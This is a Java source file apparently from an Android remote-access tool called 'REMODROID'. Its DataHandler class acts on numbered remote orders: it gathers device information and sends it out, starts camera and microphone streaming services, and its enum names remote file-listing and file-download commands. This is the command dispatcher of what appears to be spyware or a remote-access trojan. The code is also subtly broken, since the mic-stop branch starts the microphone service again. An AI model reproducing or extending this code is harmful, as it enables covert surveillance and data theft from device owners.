package com.remo.Connections;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.remo.Features.CamStream;
import com.remo.Features.MobileInfo;

public class DataHandler {

    public static void distribute(int order, Context context) {

        if (order == eDataType.DATA_TYPE_INFO.ordinal()) {

            MobileInfo mi = new MobileInfo();
            Log.d("REMODROID", mi.getInfo(context));
            mi.sendInfo(context);


        } else if (order == eDataType.DATA_TYPE_CAM_START.ordinal()) {
            Intent intent = new Intent(context, CamStream.class);
            //intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
            context.startService(intent);

        } else if (order == eDataType.DATA_TYPE_MIC_START.ordinal()) {
            Intent intent = new Intent(context, com.remo.Features.MicStream.class);
            //intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
            context.startService(intent);

        } else if (order == eDataType.DATA_TYPE_MIC_STOP.ordinal()) {
            Intent intent = new Intent(context, com.remo.Features.MicStream.class);
            //intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
            context.startService(intent);

        } else if (order == eDataType.DATA_TYPE_CAM_STOP.ordinal()) {
            CamStream.stopCam();

        }

    }


    public enum eDataType {
        DATA_TYPE_CAM_START,
        DATA_TYPE_MIC_START,
        DATA_TYPE_FM_LIST,
        DATA_TYPE_FM_DOWN_START,
        DATA_TYPE_INFO,
        DATA_TYPE_ERROR,
        DATA_TYPE_CAM_STOP,
        DATA_TYPE_MIC_STOP,
        DATA_TYPE_FM_DOWN_STOP


    }
}